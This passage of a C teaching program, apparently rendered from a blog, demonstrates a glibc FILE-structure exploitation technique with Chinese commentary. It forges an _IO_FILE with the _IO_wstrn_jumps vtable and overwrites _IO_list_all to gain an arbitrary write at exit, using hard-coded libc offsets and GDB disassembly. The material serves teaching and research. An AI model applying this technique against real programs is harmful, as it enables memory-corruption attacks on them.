_IO_wide_data *_wide_data;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE *_freeres_list;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  void *_freeres_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  size_t __pad5;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _mode;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Make sure we don&#x27;t get into trouble again.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/bits/types/struct_FILE.h, line 49)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following pointers correspond to the C++ streambuf protocol. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_buf_end;\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_save_base; /* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_save_end; /* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_marker *_markers;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE *_chain;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _fileno;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _flags2;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* 1+column number of pbase(); 0 is unknown. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  unsigned short _cur_column;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  signed char _vtable_offset;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char _shortbuf[1];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_t *_lock;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_USE_OLD_IO_FILE\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们需要使用伪造的_IO_FILE_complete_plus结构体，并将这个伪造结构体的地址写到_IO_list_all。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在调用exit函数后，结构体需要执行_IO_wstrn_overflow函数，这需要vtable填入_IO_wstrn_jumps的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/vswprintf.c, line 33)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static wint_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wstrn_overflow (FILE *fp, wint_t c)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* When we come to here this means the user supplied buffer is\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     filled.  But since we must return the number of characters which\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     would have been written in total we must provide a buffer for\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     further use.  We can do this by writing on and on in the overflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     buffer in the _IO_wstrnfile structure.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m  if (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      _IO_wsetb (fp, snf-&gt;overflow_buf,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t      / sizeof (wchar_t)), 0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t      + (sizeof (snf-&gt;overflow_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t\t / sizeof (wchar_t)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Since we are not really interested in storing the characters\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     which do not fit in the buffer we simply ignore it.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是_wide_data字段的结构体内容：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libio.h, line 121)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_wide_data\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_end;\t\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_base;\t/* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_backup_base;\t/* Pointer to first valid character of\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t   backup area */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_end;\t/* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_last_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt _codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t _shortbuf[1];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *_wide_vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，在假结构体中，我们可以控制_wide_data指针的值，因此可以实现在任意位置写入任意值。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是_IO_wstrnfile结构体的定义部分：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/strfile.h, line 49)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_streambuf\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE _f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;typedef struct _IO_strfile_\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_streambuf _sbf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_str_fields _s;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125; _IO_strfile;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;/* frozen: set when the program has requested that the array object not\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   be altered, reallocated, or freed. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define _IO_STR_FROZEN(FP) ((FP)-&gt;_f._flags &amp; _IO_USER_BUF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;typedef struct\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_strfile f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* This is used for the characters which do not fit in the buffer\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     provided by the user.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char overflow_buf[64];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125; _IO_strnfile;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;extern const struct _IO_jump_t _IO_strn_jumps attribute_hidden;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;typedef struct\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_strfile f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* This is used for the characters which do not fit in the buffer\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     provided by the user.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t overflow_buf[64];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125; _IO_wstrnfile;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以看到写入的地址值也是我们可以控制的。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;需要注意的是，&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;_IO_wstrn_overflow函数在IDA中的符号表中并不存在。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此在调试时最好可以添加glibc的源码辅助进行调试，效果更好。&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;使用dir + 源码目录即可添加源码。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;另外，可以通过https://libc.rip/查询到所有符号的偏移，&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;但数据库中尚未保存本测试环境使用的新版本的libc。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过对_IO_wstrn_jumps跳转表的定义可以大致筛选出_IO_wstrn_jumps的几个地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在__libc_IO_vtables段进行查询，可以找到两个候选的地址：0x82F80和0x847C0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;对应3个不同的_IO_jump_t结构体：0x215DC0、0x215E80、0x216180。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;经过gdb调试可知，_IO_wstrn_jumps的地址偏移应为0x215DC0，_IO_wstrn_overflow为0x82F80。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们首先获取libc地址和基地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>)<span class="built_in">puts</span> - <span class="number">0x80ED0</span>;  <span class="comment">// puts函数的偏移</span></span><br><span class="line">    FILE* fake_FILE = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;libc基地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n&quot;</span> STR_END, libc_base);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;堆地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\n&quot;</span> STR_END, (<span class="type">size_t</span>)fake_FILE);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面，我们将malloc出来的地址作为假_IO_FILE_complete_plus的地址，并修改_IO_list_all。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/genops.c， line 684)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_flush_all_lockp (int do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int result = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE *fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_start_noarg (flush_cleanup);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_lock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_flockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   || (_IO_vtable_offset (fp) == 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   )\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tresult = EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_funlockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_unlock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_end (0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return result;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;依然需要注意_IO_flush_all_lockp中的判断条件。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xd8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215DC0</span>;</span><br><span class="line">    <span class="type">size_t</span>* IO_list_all = (<span class="type">size_t</span> *) (libc_base + <span class="number">0x21A680</span>);</span><br><span class="line">    *IO_list_all = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们想要修改的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> RED <span class="string">&quot;m%#zx\n&quot;</span> STR_END, (<span class="type">size_t</span>)victim);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是通过GDB查看到的_IO_wstrn_overflow函数的汇编：\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;=&gt; 0x7ffff7e02f80 &lt;_IO_wstrn_overflow&gt;:\tendbr64 \n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f84 &lt;_IO_wstrn_overflow+4&gt;:\tpush   r12\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f86 &lt;_IO_wstrn_overflow+6&gt;:\tmov    r12d,esi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f89 &lt;_IO_wstrn_overflow+9&gt;:\t\033[1;31mlea    rsi,[rdi+0xf0]\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f90 &lt;_IO_wstrn_overflow+16&gt;:\tpush   rbx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f91 &lt;_IO_wstrn_overflow+17&gt;:\tmovq   xmm0,rsi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f96 &lt;_IO_wstrn_overflow+22&gt;:\tpunpcklqdq xmm0,xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f9a &lt;_IO_wstrn_overflow+26&gt;:\tsub    rsp,0x28\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f9e &lt;_IO_wstrn_overflow+30&gt;:\t\033[1;31mmov    rdx,QWORD PTR [rdi+0xa0]\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fa5 &lt;_IO_wstrn_overflow+37&gt;:\t\033[1;31mcmp    QWORD PTR [rdx+0x30],rsi\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fa9 &lt;_IO_wstrn_overflow+41&gt;:\tje     0x7ffff7e02fec &lt;_IO_wstrn_overflow+108&gt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fab &lt;_IO_wstrn_overflow+43&gt;:\tmovq   xmm1,rsi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fb0 &lt;_IO_wstrn_overflow+48&gt;:\tmov    rbx,rdi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fb3 &lt;_IO_wstrn_overflow+51&gt;:\txor    ecx,ecx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fb5 &lt;_IO_wstrn_overflow+53&gt;:\tmovaps XMMWORD PTR [rsp+0x10],xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fba &lt;_IO_wstrn_overflow+58&gt;:\tlea    rdx,[rdi+0x1f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fc1 &lt;_IO_wstrn_overflow+65&gt;:\tmovq   xmm2,rdx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fc6 &lt;_IO_wstrn_overflow+70&gt;:\tpunpcklqdq xmm1,xmm2\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fca &lt;_IO_wstrn_overflow+74&gt;:\tmovaps XMMWORD PTR [rsp],xmm1\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fce &lt;_IO_wstrn_overflow+78&gt;:\tcall   0x7ffff7e03610 &lt;__GI__IO_wsetb&gt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fd3 &lt;_IO_wstrn_overflow+83&gt;:\tmovdqa xmm1,XMMWORD PTR [rsp]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fd8 &lt;_IO_wstrn_overflow+88&gt;:\tmov    rdx,QWORD PTR [rbx+0xa0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fdf &lt;_IO_wstrn_overflow+95&gt;:\tmovdqa xmm0,XMMWORD PTR [rsp+0x10]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fe5 &lt;_IO_wstrn_overflow+101&gt;:\tmovups XMMWORD PTR [rdx],xmm1\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fe8 &lt;_IO_wstrn_overflow+104&gt;:\tmovups XMMWORD PTR [rdx+0x10],xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fec &lt;_IO_wstrn_overflow+108&gt;:\tmovups XMMWORD PTR [rdx+0x20],xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff0 &lt;_IO_wstrn_overflow+112&gt;:\tadd    rsp,0x28\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff4 &lt;_IO_wstrn_overflow+116&gt;:\tmov    eax,r12d\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff7 &lt;_IO_wstrn_overflow+119&gt;:\tpop    rbx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff8 &lt;_IO_wstrn_overflow+120&gt;:\tpop    r12\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ffa &lt;_IO_wstrn_overflow+122&gt;:\tret\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;上面的红色部分就是函数中的if语句比较部分，可见overflow_buf在结构体中的偏移量为0xF0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;另外看一下_IO_wsetb函数：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 91)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;void\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    free (f-&gt;_wide_data-&gt;_IO_buf_base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  f-&gt;_wide_data-&gt;_IO_buf_base = b;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  f-&gt;_wide_data-&gt;_IO_buf_end = eb;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (a)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;显然这里如果我们要伪造_wide_data，就必须绕过第一个if语句。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;如果要写入的地址一开始的_IO_buf_base处就是0，那么这个语句可以直接跳过。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;但更多时候这里的值可能不是确定的，因此需要第二个判断条件。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;_IO_FLAGS2_USER_WBUF的值为8，即让f-&gt;_flags2 